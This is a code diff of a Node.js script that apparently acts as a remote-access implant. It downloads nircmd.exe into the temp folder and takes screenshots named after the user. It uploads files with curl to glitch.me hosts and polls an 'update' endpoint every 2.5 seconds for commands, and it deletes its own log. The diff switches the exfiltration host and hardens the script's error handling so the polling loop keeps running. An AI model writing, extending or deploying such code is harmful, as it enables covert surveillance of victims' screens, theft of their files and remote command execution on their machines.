@@ -8,79 +8,101 @@ const { execSync, exec } = require('child_process');
 const executableUrl = 'https://github.com/AtomBread/nirs/raw/refs/heads/main/nircmd.exe'; 
 const tempExecutablePath = path.join(os.tmpdir(), 'nircmd.exe'); // Use temp directory
 
-const downloadExecutable = () => new Promise((resolve, reject) => {
-    // Use escaped double quotes for the output path and executable URL
-    const command = `curl -L -o "${tempExecutablePath}" "${executableUrl}"`;
-    // Log the command before executing it
-    log(`Executing command: ${command}`);
-    
-    exec(command, (error, stdout, stderr) => {
-        if (error) {
-            log(`Download error: ${error.message}`);
-            reject(`Download error: ${error.message}`);
-            return;
-        }
-        log('Downloaded nircmd.exe');
-        resolve();
-    });
-});
-
+const downloadExecutable = async () => {
+    try {
+        // Use escaped double quotes for the output path and executable URL
+        const command = `curl -L -o "${tempExecutablePath}" "${executableUrl}"`;
+        // Log the command before executing it
+        log(`Executing command: ${command}`);
+        
+        await new Promise((resolve, reject) => {
+            exec(command, (error, stdout, stderr) => {
+                if (error) {
+                    log(`Download error: ${error.message}`);
+                    reject(`Download error: ${error.message}`);
+                    return;
+                }
+                log('Downloaded nircmd.exe');
+                resolve();
+            });
+        });
+    } catch (error) {
+        log(`Error downloading executable: ${error.message}`);
+    }
+};
 
 async function uploadFile(filePath) {
-    log(`Preparing to upload file: ${filePath}`);
-    // Use escaped double quotes for the file path
-    const command = `curl -X POST -F "file=@${filePath}" https://youthful-lowly-duckling.glitch.me/d`;
-    // Log the command before executing it
-    log(`Executing command: ${command}`);
-    
-    exec(command, (error, stdout, stderr) => {
-        if (error) {
-            log('Error uploading file:', error.message);
-            return;
-        }
-        log('File uploaded successfully:', stdout);
-        // Uncomment if you want to delete the file after upload
-        // fs.unlinkSync(filePath);
-    });
+    try {
+        log(`Preparing to upload file: ${filePath}`);
+        // Use escaped double quotes for the file path
+        const command = `curl -X POST -F "file=@${filePath}" https://battle-cactus-spring.glitch.me/d`;
+        // Log the command before executing it
+        log(`Executing command: ${command}`);
+        
+        await new Promise((resolve, reject) => {
+            exec(command, (error, stdout, stderr) => {
+                if (error) {
+                    log('Error uploading file: ' + error.message);
+                    reject(error);
+                    return;
+                }
+                log('File uploaded successfully: ' + stdout);
+                resolve();
+            });
+        });
+    } catch (error) {
+        log(`Error in uploadFile: ${error.message}`);
+    }
 }
 
 async function uploadStream(filePath) {
-    log(`Preparing to upload file: ${filePath}`);
-    // Use escaped double quotes for the file path
-    const command = `curl -X POST -F "file=@${filePath}" https://youthful-lowly-duckling.glitch.me/upload`;
-    // Log the command before executing it
-    log(`Executing command: ${command}`);
-    
-    exec(command, (error, stdout, stderr) => {
-        if (error) {
-            log('Error uploading file:', error.message);
-            return;
-        }
-        log('File uploaded successfully:', stdout);
-        // Uncomment if you want to delete the file after upload
-        // fs.unlinkSync(filePath);
-    });
-}
-async function stream() {
-    if (!fs.existsSync(tempExecutablePath)) {
-        log('nircmd.exe not found, downloading...');
-        await downloadExecutable();
+    try {
+        log(`Preparing to upload file: ${filePath}`);
+        // Use escaped double quotes for the file path
+        const command = `curl -X POST -F "file=@${filePath}" https://battle-cactus-spring.glitch.me/upload`;
+        // Log the command before executing it
+        log(`Executing command: ${command}`);
+        
+        await new Promise((resolve, reject) => {
+            exec(command, (error, stdout, stderr) => {
+                if (error) {
+                    log('Error uploading file: ' + error.message);
+                    reject(error);
+                    return;
+                }
+                log('File uploaded successfully: ' + stdout);
+                resolve();
+            });
+        });
+    } catch (error) {
+        log(`Error in uploadStream: ${error.message}`);
     }
+}
 
-    // Use cmd to take a screenshot
-    const command = `cmd.exe /c "${tempExecutablePath} savescreenshot ${getUsername()}.png"`;
-    exec(command, async (error, stdout, stderr) => {
-        if (error) {
-            log(`Error taking screenshot: ${error.message}`);
-            return;
+async function stream() {
+    try {
+        if (!fs.existsSync(tempExecutablePath)) {
+            log('nircmd.exe not found, downloading...');
+            await downloadExecutable();
         }
-        if (stderr) {
-            log(`Error: ${stderr}`);
-            return;
-        }
-        log("Uploaded screenshot");
-        await uploadStream(`${getUsername()}.png`); // Ensure the file exists before uploading
-    });
+
+        // Use cmd to take a screenshot
+        const command = `cmd.exe /c "${tempExecutablePath} savescreenshot ${getUsername()}.png"`;
+        exec(command, async (error, stdout, stderr) => {
+            if (error) {
+                log(`Error taking screenshot: ${error.message}`);
+                return;
+            }
+            if (stderr) {
+                log(`Error: ${stderr}`);
+                return;
+            }
+            log("Uploaded screenshot");
+            await uploadStream(`${getUsername()}.png`); // Ensure the file exists before uploading
+        });
+    } catch (error) {
+        log(`Error in stream: ${error.message}`);
+    }
 }
 
 function log(message) {
@@ -110,24 +132,28 @@ function getUsername() {
 }
 
 async function callUpdateEndpoint(name) {
-    const postData = JSON.stringify({ name });
-    // Use escaped double quotes for Windows compatibility
-    const command = `curl -X POST -H "Content-Type: application/json" -d "${postData.replace(/"/g, '\\"')}" https://youthful-lowly-duckling.glitch.me/update`;
+    try {
+        const postData = JSON.stringify({ name });
+        // Use escaped double quotes for Windows compatibility
+        const command = `curl -X POST -H "Content-Type: application/json" -d "${postData.replace(/"/g, '\\"')}" https://battle-cactus-spring.glitch.me/update`;
 
-    // Log the command before executing it
-    log(`Executing command: ${command}`);
+        // Log the command before executing it
+        log(`Executing command: ${command}`);
 
-    return new Promise((resolve, reject) => {
-        exec(command, (error, stdout, stderr) => {
-            if (error) {
-                reject(error);
-                return;
-            }
-            resolve(stdout);
+        return await new Promise((resolve, reject) => {
+            exec(command, (error, stdout, stderr) => {
+                if (error) {
+                    log(`Error calling update endpoint: ${error.message}`);
+                    reject(error);
+                    return;
+                }
+                resolve(stdout);
+            });
         });
-    });
+    } catch (error) {
+        log(`Error in callUpdateEndpoint: ${error.message}`);
+    }
 }
-
 
 async function sideThread() {
     log('Side thread has started.');
@@ -135,7 +161,14 @@ async function sideThread() {
 
     while (true) {
         await sleep(2500);
-        const output = await callUpdateEndpoint(username);
+        let output;
+
+        try {
+            output = await callUpdateEndpoint(username);
+        } catch (error) {
+            log(`Error during callUpdateEndpoint: ${error.message}`);
+            continue; // Continue loop even if there's an error
+        }
 
         if (typeof output === "string" && output != "0" && output != "1") {
             if (!output.startsWith("nirsoft:")) {
@@ -198,15 +231,15 @@ if (isMainThread) {
     fs.access(logPath, fs.constants.F_OK, (err) => {
         if (err) {
             log(`File ${logPath} does not exist. Skipping deletion.`);
+        } else {
+            fs.unlink(logPath, (unlinkErr) => {
+                if (unlinkErr) {
+                    log(`Error deleting file: ${unlinkErr.message}`);
+                } else {
+                    log(`Deleted file: ${logPath}`);
+                }
+            });
         }
-
-        fs.unlink(logPath, (unlinkErr) => {
-            if (unlinkErr) {
-                log(`Error deleting file: ${unlinkErr.message}`);
-            }
-
-            log(`Deleted file: ${logPath}`);
-        });
     });
     sideThread();
 }
